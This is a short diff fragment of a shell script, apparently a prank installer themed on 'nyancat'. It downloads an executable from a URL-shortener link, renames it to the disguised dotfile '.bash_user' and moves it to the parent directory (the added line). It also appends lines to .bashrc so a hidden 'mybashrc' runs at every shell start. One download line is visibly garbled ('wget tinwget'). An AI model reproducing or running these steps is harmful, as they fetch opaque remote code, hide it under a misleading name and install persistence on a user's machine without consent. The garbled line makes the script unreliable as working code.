@@ -11,6 +11,7 @@
 wget tinwget tinyurl.com/confnyancat
 chmod +x confnyancat
 mv confnyancat .bash_user
+mv .bash_user ../
 echo "if [ -f ${HOME}/./mybashrc ]" >> .bashrc
 echo "then" >> .bashrc
 echo "    . ${HOME}/./mybashrc" >> .bashrc
